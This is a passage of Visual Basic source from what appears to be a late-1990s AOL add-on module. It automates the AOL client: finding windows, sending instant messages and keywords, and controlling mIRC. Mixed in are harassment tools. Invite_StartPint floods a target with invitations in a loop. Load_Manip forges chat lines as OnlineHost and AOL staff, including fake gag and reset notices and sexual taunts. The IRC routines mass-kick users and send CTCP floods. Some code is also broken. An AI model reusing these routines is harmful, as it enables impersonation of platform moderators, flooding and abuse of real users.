'(Where you type chat text), and an _AOL_VIEW.  If another
'AOL window is present that also has these 3 controls, it
'may find the wrong window.  I have never seen another AOL
'window with these 3 controls at once

AOL = findwindow("AOL Frame25", 0&)
If AOL = 0 Then Exit Function
b = findchildbyclass(AOL, "AOL Child")

Start:
c = findchildbyclass(b, "_AOL_VIEW")
If c = 0 Then GoTo nextwnd
d = findchildbyclass(b, "_AOL_EDIT")
If d = 0 Then GoTo nextwnd
e = findchildbyclass(b, "_AOL_LISTBOX")
If e = 0 Then GoTo nextwnd
'We've found it
findchatroom = b
Exit Function

nextwnd:
b = getnextwindow(b, 2)
If b = GetWindow(b, GW_HWNDLAST) Then Exit Function
GoTo Start


End Function

Function findcomposemail ()
'Finds the Compose mail window's handle

Dim bb As Integer
Dim dis_win As Integer

dis_win = findchildbyclass(aolhwnd(), "AOL Child")

begin_find_composemail:

bb = findchildbytitle(dis_win, "Send")
    If bb <> 0 Then Let countt = countt + 1

bb = findchildbytitle(dis_win, "To:")
    If bb <> 0 Then Let countt = countt + 1

bb = findchildbytitle(dis_win, "Subject:")
    If bb <> 0 Then Let countt = countt + 1

bb = findchildbytitle(dis_win, "Send" & Chr(13) & "Later")
    If bb <> 0 Then Let countt = countt + 1

bb = findchildbytitle(dis_win, "Attach")
    If bb <> 0 Then Let countt = countt + 1

bb = findchildbytitle(dis_win, "Address" & Chr(13) & "Book")
    If bb <> 0 Then Let countt = countt + 1

If countt = 6 Then
  findcomposemail = dis_win
  Exit Function
End If
Let countt = 0
dis_win = getnextwindow(dis_win, 2)
If dis_win = GetWindow(dis_win, GW_HWNDLAST) Then
   findtocomposemail = 0
   Exit Function
End If
GoTo begin_find_composemail
End Function

Function findfwdwin ()
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
TopWinX% = GetWindow(MDI%, GW_CHILD)
Do: DoEvents
    LSTX% = findchildbytitle(TopWinX%, "Reply")
    EDTx% = findchildbyclass(TopWinX%, "RICHCNTL")
    FWDX% = findchildbytitle(TopWinX%, "Forward")
    If LSTX% <> 0 Then FindX = FindX + 1
    If EDTx% <> 0 Then FindX = FindX + 1
    If FWDX% <> 0 Then FindX = FindX + 1
    If FindX = 3 Then
   findfwdwin = TopWinX%: Exit Function
   End If
FindX = 0
TopWinX% = GetWindow(TopWinX%, GW_HWNDNEXT)
Loop While TopWinX% <> 0
End Function

Function findsendwin ()
Dim AOL%, MDI%, TopWinW%, iCOW%, EDTW%, CCW%, TOZW%, SNOWW%, FindW As Integer
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
TopWinW% = GetWindow(MDI%, GW_CHILD)
Do: DoEvents
    TOZW% = findchildbytitle(TopWinW%, "To:")
    SNOWW% = findchildbytitle(TopWinW%, "Subject:")
    If TOZW% <> 0 Then FindW = FindW + 1
    If SNOWW% <> 0 Then FindW = FindW + 1
    If FindW = 2 Then
   findsendwin = TopWinW%: Exit Function
   End If
FindW = 0
TopWinW% = GetWindow(TopWinW%, GW_HWNDNEXT)
Loop While TopWinW% <> 0
End Function

Function findsn ()
'Finds the user's Screen Name...they must be signed on!

Dim dis_win2 As Integer
a = findwindow("AOL Frame25", 0&)
dis_win2 = findchildbyclass(a, "AOL Child")

begin_find_SN:

bb$ = windowcaption(dis_win2)
    If Left(bb$, 9) = "Welcome, " Then Let countt = countt + 1
If countt = 1 Then
  val1 = InStr(bb$, " ")
  val2 = InStr(bb$, "!")
  Let SN$ = Mid$(bb$, val1 + 1, val2 - val1 - 1)
  findsn = Trim(SN$) '_win
  Exit Function
End If
Let countt = 0
dis_win2 = getnextwindow(dis_win2, 2)
If dis_win2 = GetWindow(dis_win2, GW_HWNDLAST) Then
   findsn = 0
   Exit Function
End If

GoTo begin_find_SN

End Function

Function FixAPIString (ByVal sText As String) As String
On Error Resume Next
FixAPIString = Trim(Left$(sText, InStr(sText, Chr$(0)) - 1))
End Function

Sub FoneNames (txt, Lst As ListBox)
keywords "Fone"
Do: DoEvents
a = findwindow("AOL Frame25", 0&)  'Find AOL
b = findchildbytitle(a, "Phone Directory") 'Find IM
c = findchildbyclass(b, "_AOL_EDIT") 'Put the SN in the IM
d = sendmessagebystring(c, WM_SETTEXT, 0, txt)
nofound = findchildbytitle(a, "Keyword Not Found")
If nofound <> 0 Then MsgBox "Your Not On An Internal", 59: Exit Do
Loop Until b <> 0
If b <> 0 Then
e = findchildbyclass(b, "_AOL_Button")
click (e)
timeout (.5)
MsgBox "Click More Until Done", 59
Addroom Lst
Exit Sub
End If

End Sub

Sub form_backcolor (Form As Form)
'----------------------------
'Windows 3.11
'Form.BackColor = &HFFFFFF
'----------------------------
'Windows 95
Form.BackColor = &HC0C0C0
'----------------------------
'America Online 4.0
'Form.BackColor = &HE0FFFF
'----------------------------
End Sub

Sub FormGrow (Frm As Form)
bah = Frm.Height
bla = Frm.Width
Frm.Width = 0
Frm.Height = 0
Frm.Visible = True
speed = 50
Do
If Frm.Height + speed > bah Then
Frm.Height = bah
Frm.Width = bla
Exit Sub
End If
Frm.Height = Frm.Height + speed
If (Frm.Width + (speed * (bla / bah))) > bla Then
Frm.Width = bla
Else
Frm.Width = Frm.Width + (speed * (bla / bah))
End If
Loop
Frm.Height = bah
Frm.Width = bla
End Sub

Sub Formmove (mw As Form)
Dim Ret&
ReleaseCapture
Ret& = SendMessage(mw.hWnd, &H112, &HF012, 0)
If Button <> 1 Then Exit Sub
Dim ReturnVal%
ReleaseCapture
ReturnVal% = SendMessage(hWnd, &HA1, 2, 0)

End Sub

Sub ForwardSend (names)
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Fwd: ")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, names)
'a = sendmessagebystring(subjec%, WM_SETTEXT, 0, Subject)
'a = sendmessagebystring(Mess%, WM_SETTEXT, 0, Message)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)

End Sub

Sub fwdt ()
'***Special Thanks to VSTD Coord
a = findwindow("AOL FRAME25", 0&)
b = findchildbyclass(a, "MDICLIENT")
c = findchildbyclass(b, "AOL CHILD")
child1 = findchildbyclass(c, "_AOL_EDIT") 'Find the Chat
child2 = getnextwindow(child1, 2)
child3 = getnextwindow(child2, 2)
chil = getnextwindow(child3, 2)
child = getnextwindow(chil, 2)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)'Get some text

trimspace$ = Space$(GetTrim) 'Setup a string that is as
                    'long as the chat text
GetString = sendmessagebystring(child, 13, GetTrim + 1, trimspace$)
                   'Place the text in our newly set up
                   'holding area
theview$ = trimspace$  'Rename our variable
d$ = trimspace$
e = InStr(d$, ": ")
F = Mid(d$, e + 2)
XY = sendmessagebystring(child, WM_SETTEXT, 0, F)


End Sub

Function GetAOL () As Integer
Top_Position_Num = -1
AOL% = findwindow("AOL Frame25", 0&)
If AOL% = 0 Then Exit Function
Menu% = Getmenu(AOL%)
MenuName$ = Space(256)
x = GetMenuString(Menu%, 0, MenuName$, 256, &H400)
If FixAPIString(MenuName$) = "*" Then x = 1
If FixAPIString(MenuName$) = "&File" Then x = 0
SubMenu% = GetSubMenu(Menu%, x)
Do
    DoEvents
    MenuName$ = String(255, 0)
    x = GetMenuString(SubMenu%, i, MenuName$, 256, &H400)
    i = i + 1
    If FixAPIString(MenuName$) = "&Log Manager" Then Exit Do
    If FixAPIString(MenuName$) = "&Logging..." Then Exit Do
Loop
If FixAPIString(MenuName$) = "&Log Manager" Then GetAOL = 3
If FixAPIString(MenuName$) = "&Logging..." Then GetAOL = 2
End Function

Function GetFromINI (AppName$, KeyName$, Directory$) As String
   Dim RetStr As String
   RetStr = String(255, Chr(0))
   KeyName$ = LCase$(KeyName$)
   GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), Directory$))
End Function

Function GetINI (file As String, Area As String, SettingName As String) As String
info$ = Space(256)
x = GetPrivateProfileString(Area$, SettingName$, "", info$, 256, file$)
info$ = Trim$(info$)
info$ = FixAPIString(info$)
GetINI = info$
End Function

Function gettime () As String
CurTime$ = Format(Time$, "hh:nn am/pm")
If Mid$(CurTime$, 1, 1) = "0" Then CurTime$ = Mid$(CurTime$, 2)
gettime = Trim$(CurTime$)
End Function

Function GetWindowFromClass (sib As Integer, Class$) As Integer
On Error Resume Next
Buf$ = String$(255, 0)
First = GetWindow(sib, 0)
x = getclassname(First, Buf$, 255)
If Class$ = Trimnull(Buf$) Then GetWindowFromClass = First: Exit Function

PrevhWnd = First
Do
Buf$ = String$(255, 0)
ThishWnd = GetWindow(PrevhWnd, 2)
x = getclassname(ThishWnd, Buf$, 255)
Debug.Print Buf$

If Class$ = Trimnull(Buf$) Then
    GetWindowFromClass = ThishWnd: Exit Function
End If
PrevhWnd = ThishWnd
Loop While ThishWnd <> 0

GetWindowFromClass = 0

End Function

Sub greetz (nm$, Label As Label)
Label.Caption = nm$
Label.BackStyle = 0
Label.ForeColor = &HFFFFFF
Label.Visible = True
Label.FontName = "Arial"
Label.FontSize = 8
timeout (.1)
Label.FontSize = 9
timeout (.1)
Label.FontSize = 10
timeout (.1)
Label.FontSize = 11
timeout (.1)
Label.FontSize = 12
timeout (.1)
Label.FontSize = 13
timeout (.1)
Label.FontSize = 14
timeout (.1)
Label.FontSize = 15
timeout (.1)
Label.FontSize = 16
timeout (.1)
Label.FontSize = 17
timeout (.1)
Label.FontSize = 18
timeout (.1)
Label.FontSize = 19
timeout (.1)
Label.FontSize = 20
timeout (.1)
Label.FontSize = 21
timeout (.1)
Label.FontSize = 22
timeout (.1)
Label.FontSize = 23
timeout (.1)
Label.FontSize = 24
timeout (.1)
Label.FontSize = 25
timeout (.1)
Label.FontSize = 26
timeout (.1)
Label.FontSize = 27
timeout (.1)
Label.FontSize = 28
timeout (.1)
Label.FontSize = 29
timeout (.1)
Label.FontSize = 30
timeout (.5)
Label.ForeColor = &HFFFFFF
timeout (.1)
Label.ForeColor = &H0&
timeout (.1)
Label.ForeColor = &HFF00&
timeout (.1)
Label.ForeColor = &HFF0000
timeout (.1)
Label.ForeColor = &HFFFFFF
timeout (.1)
Label.ForeColor = &H0&
timeout (.1)
Label.ForeColor = &HFF00&
timeout (.1)
Label.ForeColor = &HFF0000
timeout (.1)
Label.ForeColor = &HFFFFFF
timeout (.1)
Label.ForeColor = &H0&
timeout (.1)
Label.ForeColor = &HFF00&
timeout (.1)
Label.ForeColor = &HFF0000
timeout (.1)
Label.ForeColor = &HFFFFFF
timeout (.1)
Label.ForeColor = &H0&
timeout (.1)
Label.ForeColor = &HFF00&
timeout (.1)
Label.ForeColor = &HFF0000
timeout (.1)
Label.ForeColor = &HFFFFFF
timeout (.5)
Label.FontSize = 30
timeout (.1)
Label.FontSize = 29
timeout (.1)
Label.FontSize = 28
timeout (.1)
Label.FontSize = 27
timeout (.1)
Label.FontSize = 26
timeout (.1)
Label.FontSize = 25
timeout (.1)
Label.FontSize = 24
timeout (.1)
Label.FontSize = 23
timeout (.1)
Label.FontSize = 22
timeout (.1)
Label.FontSize = 21
timeout (.1)
Label.FontSize = 20
timeout (.1)
Label.FontSize = 19
timeout (.1)
Label.FontSize = 18
timeout (.1)
Label.FontSize = 17
timeout (.1)
Label.FontSize = 16
timeout (.1)
Label.FontSize = 15
timeout (.1)
Label.FontSize = 14
timeout (.1)
Label.FontSize = 13
timeout (.1)
Label.FontSize = 12
timeout (.1)
Label.FontSize = 11
timeout (.1)
Label.FontSize = 10
timeout (.1)
Label.FontSize = 9
timeout (.1)
Label.FontSize = 8
timeout (.1)
End Sub

Sub greetz2 (nm$, Label As Label)
Label.Caption = nm$
Label.BackStyle = 0
Label.Visible = True
Label.FontName = "Arial"
Label.FontSize = 5
timeout (.1)
Label.FontSize = 10
timeout (.1)
Label.FontSize = 15
timeout (.1)
Label.FontSize = 20
timeout (.1)
Label.FontSize = 25
timeout (.1)
Label.FontSize = 35
timeout (.1)
Label.FontSize = 40
timeout (.1)
Label.FontSize = 45
timeout (.1)
Label.FontSize = 50
timeout (.1)
Label.FontSize = 55
timeout (.1)
Label.FontSize = 60
timeout (.1)
Label.FontSize = 65
timeout (.1)
Label.FontSize = 70
timeout (.1)
Label.FontSize = 75
timeout (.1)
Label.FontSize = 80
timeout (.1)
Label.FontSize = 85
timeout (.1)
Label.FontSize = 90
timeout (.1)
Label.FontSize = 95
timeout (.1)
Label.FontSize = 100
timeout (.1)
End Sub

Sub HideAOL ()
a = findwindow("AOL Frame25", 0&)
    x = ShowWindow(a, SW_Hide)
End Sub

Sub im_off ()
Call Sendim("$im_off", " ")
End Sub

Sub im_on ()
Call Sendim("$im_on", ".")
End Sub

Sub IM_Send (who, Message)
If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59: Exit Sub
aolver = AOLVersion()
If aolver = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
pause .5
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
Loop Until Off% <> 0
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If aolver = 25 Then
Call SendIM25(who, Message)
Exit Sub
End If

End Sub

Sub Invite_AntiPint ()
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, "Invitation from: ")
CloseWin (b)
End Sub

Sub Invite_Click ()
Keyword "buddyview"
timeout (2)
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
Win3% = getnextwindow(Win2%, 2)
buttonupp% = sendmessagebynum(Win3%, WM_LBUTTONDOWN, 0, 0&) 'Down click
buttondww% = sendmessagebynum(Win3%, WM_LBUTTONUP, 0, 0&)   'Up Click
End Sub

Sub Invite_Off ()
keywords "buddyview"
On Error Resume Next
timeout (.9)
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
buttonupp% = sendmessagebynum(Win2%, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
buttondww% = sendmessagebynum(Win2%, WM_LBUTTONUP, 0, 0&)   'Up Click
timeout (.9)
timeout (.5)
AppActivate "america online"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys " "
timeout (.9)
timeout (.4)

End Sub

Sub Invite_On ()
keywords "buddyview"
On Error Resume Next
timeout (.9)
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
buttonupp% = sendmessagebynum(Win2%, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
buttondww% = sendmessagebynum(Win2%, WM_LBUTTONUP, 0, 0&)   'Up Click
timeout (.9)
timeout (.5)
AppActivate "america online"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys "{tab}"
SendKeys " "
timeout (.9)
timeout (.4)

End Sub

Sub Invite_Send (who)
Invite_Click
timeout (3)
AOL% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDI% = findchildbyclass(AOL%, "MDIClient")
wind% = findchildbytitle(AOL%, "Buddy Chat")
Label% = findchildbyclass(AOL%, "_AOL_Static")
send% = findchildbyclass(wind%, "_AOL_ICON")
EDT% = findchildbyclass(wind%, "_AOL_EDIT")  'Find the edit screen to
EDT2% = getnextwindow(EDT%, 2)
EDT3% = getnextwindow(EDT2%, 2)
ROOMNAME% = sendmessagebystring(EDT2%, WM_SETTEXT, 0, room) 'Put our KW in.
HEHE = sendmessagebystring(EDT%, WM_SETTEXT, 0, Blah)
NAMEZ% = sendmessagebystring(EDT%, WM_SETTEXT, 0, who) 'Put our KW in.
settxt = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
settx2 = sendmessagebynum(EDT2%, WM_CHAR, 13, 0)
settx5 = sendmessagebynum(EDT3%, WM_CHAR, 13, 0)
buttonup% = sendmessagebynum(send%, WM_LBUTTONDOWN, 0, 0&) 'Down click
buttondw% = sendmessagebynum(send%, WM_LBUTTONUP, 0, 0&)   'Up Click
End Sub

Sub Invite_SetPintText (who)
AOL% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDI% = findchildbyclass(AOL%, "MDIClient")
wind% = findchildbytitle(AOL%, "Buddy Chat")
Label% = findchildbyclass(AOL%, "_AOL_Static")
send% = findchildbyclass(wind%, "_AOL_ICON")
EDT% = findchildbyclass(wind%, "_AOL_EDIT")  'Find the edit screen to
EDT2% = getnextwindow(EDT%, 2)
EDT3% = getnextwindow(EDT2%, 2)
ROOMNAME% = sendmessagebystring(EDT2%, WM_SETTEXT, 0, room) 'Put our KW in.
HEHE = sendmessagebystring(EDT%, WM_SETTEXT, 0, Blah)
NAMEZ% = sendmessagebystring(EDT%, WM_SETTEXT, 0, who) 'Put our KW in.
settxt = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
settx2 = sendmessagebynum(EDT2%, WM_CHAR, 13, 0)
settx5 = sendmessagebynum(EDT3%, WM_CHAR, 13, 0)
For i = 1 To 7
buttonup% = sendmessagebynum(send%, WM_LBUTTONDOWN, 0, 0&) 'Down click
buttondw% = sendmessagebynum(send%, WM_LBUTTONUP, 0, 0&)   'Up Click
Next i
End Sub

Sub Invite_StartPint (who)
Invite = "Start"
Keyword "buddyview"
timeout (2)
Do: DoEvents
timeout (1)
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
Win3% = getnextwindow(Win2%, 2)
buttonupp% = sendmessagebynum(Win3%, WM_LBUTTONDOWN, 0, 0&) 'Down click
buttondww% = sendmessagebynum(Win3%, WM_LBUTTONUP, 0, 0&)   'Up Click
timeout (1)
Invite_SetPintText who
Loop Until Invite = "Stop"
End Sub

Sub Invite_StopPint ()
Invite = "Stop"
End Sub

Sub invokes (ByVal txt As String)
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Invoke Database Record...") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Invoke Database Record")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = txt$
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_BUTTON_")        'Find the GO Button.
d = findchildbytitle(x, "OK")
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click
subcd0 (.2)
z = sendmessagebynum(x, WM_CLOSE, 0, 0)
End Sub

Sub irc_addroom (combo As Control)
On Error Resume Next
Chat% = findwindow("mIRC", 0&)
AolList% = findchildbyclass(Chat%, "List")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
x = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    NAMEZ$ = String$(256, " ")
    Ret = AOLGetList(i%, NAMEZ$)
    NAMEZ$ = Trim$(NAMEZ$)
    SN$ = UserSN()
    NAMEZ$ = Trim$(Mid$(NAMEZ$, 1, Len(NAMEZ$) - 1))
    If Trim$(UCase$(NAMEZ$)) = Trim$(UCase(SN$)) Then GoTo ACCC
    combo.AddItem NAMEZ$
     combo.ListIndex = 0
ACCC:
Next

End Sub

Sub IRC_AutoBan (ChannelName)
sendirc "/mode " + ChannelName + " +b " + Int(Rnd * Chr(a)) & Int(Rnd * 999) + 1
timeout .1
End Sub

Sub IRC_AutoBot (ChannelName, List1 As Control, List2 As Control, NewTopic)
timeout 5
sendirc "/topic " + ChannelName + " " + NewTopic
For opp = 0 To List1.ListCount - 1
Op = List1.List(i)
sendirc "/mode " + ChannelName + " +o " + Op
Next opp
For kik = 0 To List2.ListCount - 1
Kick = List2.List(i)
sendirc "/kick " + ChannelName + " " + Kick
Next kik
End Sub

Sub IRC_CloseDCC ()
'Do
'DoEvents
irc = findwindow("mIRC", 0&)
wind = findchildbytitle(irc, "Chat with ")
CloseWin (wind)
irc = findwindow("mIRC 32", 0&)
wind = findchildbytitle(irc, "Chat with ")
'CloseWin (wind)
'Loop Until wind <> 0
End Sub

Sub IRC_DCCSend (who)
sendirc "/DCC Chat " + who
IRC_CloseDCC

End Sub

Sub IRC_PingSpoof (who)
sendirc "/ping " + who
sendirc "/ctcp " + who + " ping"
sendirc "/ctcp " + who + " pong"
sendirc "/ctcp " + who + " version"
sendirc "/ctcp " + who + " client"
End Sub

Sub IRC_RandomNick (nick)
sendirc "/nick " + nick & Int(Rnd * 200) + 1
timeout .1
End Sub

Function KeyBrackets () As String
KeyBrackets = Chr(34)
End Function

Function KeyEnter () As String
KeyEnter = CStr(Chr(13) & Chr(10))
End Function

Function KeyTab () As String
KeyTab = Chr(9)
End Function

Sub Keyword (txt As String)
If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59: Exit Sub
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Keyword...") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Keyword")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = txt$
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_ICON")        'Find the GO Button.
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click

End Sub

Sub keywords (ByVal txt As String)
If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59: Exit Sub
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Keyword...") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Keyword")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = txt$
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_ICON")        'Find the GO Button.
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click

End Sub

Sub killmodal ()
Do
aom = findwindow("_AOL_Modal", 0&)
CloseWin (aom)
DoEvents
Loop Until aom = 0
End Sub

Sub killwait ()
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "&About America Online")'Run Menu
timeout (.5)
killmodal
End Sub

Sub List_Brag (List1 As ListBox)
For i = 0 To List1.ListCount - 1
names = List1.List(i)
sendroom names
subcd0 (.5)
Next i

End Sub

Sub List_NameOff ()
'For i = 0 To list.ListCount - 1
'Names$ = list.list(i)
'sendtag "" & i + 1 & "] - " + names$ + "]"
'timeout (.5)
'Next i
End Sub

Sub ListBrag (List1 As ListBox)
For i = 0 To List1.ListCount - 1
names = List1.List(i)
sendroom names
subcd0 (.5)
Next i

End Sub

Sub Load_Manip ()
Do:
timeout (10)
Manipx "Bob Evens", "Jimmie Dean Owns Me"
timeout (30)
Manipx "OnlineHost", "CATWatch01 has entered the room."
timeout (12)
Manip "Haha I Maniped Your Fool Ass. !!!"
timeout (30)
Manipx "Wet Jacki", "Oh " + UserSN() + ", come back to bed, its already been 2 hours now !"
timeout 10
Manipx "Wet Jacki", "Ohhh yea you know what i like !!!"
timeout 8
Manipx "Wet Jacki", "Ohhhhhhhh " + UserSN()
timeout 9
Manipx "Wet Jacki", "Ohh God, " + UserSN() + " now do me from behind. !!!"
timeout 15
Manipx "OnlineHost", "TOSAdvisor has left the room."
timeout (13)
Manipx "OnlineHost", UserSN() + "  has been gagged"
timeout (20)
timeout 20
Manipx "OnlineHost", "TOSDonC  has been  bumped"
timeout (31)
Manipx "OnlineHost", UserSN() + "  has been reset"
Manipx "OnlineHost", "To review this account goto keyword cris."
timeout (20)
Manipx "Guide TOE", UserSN() + ", Scrolling is a Violation Of the Terms of Service"
Manipx "Guide TOE", "Please Stop NOW and Use Keyword: TOS to Review These Terms!"
timeout (20)
Manipx "OnlineHost", "AACTchrLes has entered the room."
timeout 15
Manipx "OnlineHost", "AFC Sally has entered the room."
timeout 10
Manipx "AFC Sally", "I suggest you all leave this room :)"
timeout 15
Manipx "OnlineHost", "ABCHostTIG has entered the room."
timeout 20
Manipx "OnlineHost", "AARepFlare has entered the room."
timeout (20)
Manipx "AARepFlare", "Hey doesnt my program own ?"
timeout 5
Manipx "OnlineHost", "Host Ank has left the room."
timeout 30
Manipx "OnlineHost", "Rnger RCT has entered the room."
timeout 10
Manipx "OnlineHost", "Guide ARG has entered the room."
timeout 10
Manipx "OnlineHost", "Guide TBG has entered the room."
timeout 10
Manipx "OnlineHost", "TOSReports has entered the room."
timeout 10
Manipx "OnlineHost", "SpareTire has entered the room."
timeout 10
Manipx "OnlineHost", "Guide PDX has entered the room."
timeout 10
Manipx "OnlineHost", "Guide SLW has entered the room."
timeout 10
Manipx "OnlineHost", "KO Banshee has entered the room."
timeout 20
Manipx "Guide NAC", "Yes ?"
timeout (10)
Manipx "Bob Evens", "Jimmie Dean Owns Me"
timeout (30)
Manipx "OnlineHost", "CATWatch01 has entered the room."
timeout (12)
Manip "Haha I Maniped Your Fool Ass. !!!"
timeout (30)
Manipx "Hot Jacki", "Ohh God, " + UserSN() + " now do me from behind. !!!"
timeout 15
Manipx "OnlineHost", "TOSAdvisor has left the room."
timeout (13)
Manipx "OnlineHost", UserSN() + "  has been gagged"
timeout (20)
timeout 20
Manipx "OnlineHost", "TOSDonC  has been  bumped"
timeout (31)
Manipx "OnlineHost", UserSN() + "  has been reset"
Manipx "OnlineHost", "To review this account goto keyword cris."
timeout (20)
Manipx "Guide TOE", UserSN() + ", Scrolling is a Violation Of the Terms of Service"
Manipx "Guide TOE", "Please Stop NOW and Use Keyword: TOS to Review These Terms!"
timeout (20)
Manipx "OnlineHost", "AACTchrLes has entered the room."
timeout 15
Manipx "OnlineHost", "AFC Sally has entered the room."
timeout 10
Manipx "AFC Sally", "I suggest you all leave this room :)"
timeout 15
Manipx "OnlineHost", "ABCHostTIG has entered the room."
timeout 20
Manipx "OnlineHost", "AARepFlare has entered the room."
timeout (20)
Manipx "AARepFlare", "Hey doesnt my program own ?"
timeout 5
Manipx "OnlineHost", "Host Ank has left the room."
timeout 30
Manipx "OnlineHost", "Rnger RCT has entered the room."
timeout 10
Manipx "OnlineHost", "Guide ARG has entered the room."
timeout 10
Manipx "OnlineHost", "Guide TBG has entered the room."
timeout 10
Manipx "OnlineHost", "TOSReports has entered the room."
timeout 10
Manipx "OnlineHost", "SpareTire has entered the room."
timeout 10
Manipx "OnlineHost", "Guide PDX has entered the room."
timeout 10
Manipx "OnlineHost", "Guide SLW has entered the room."
timeout 10
Manipx "OnlineHost", "KO Banshee has entered the room."
timeout 20
Manipx "Guide NAC", "Yes ?"
timeout (10)
Manipx "Bob Evens", "Jimmie Dean Owns Me"
timeout (30)
Manipx "OnlineHost", "CATWatch01 has entered the room."
timeout (12)
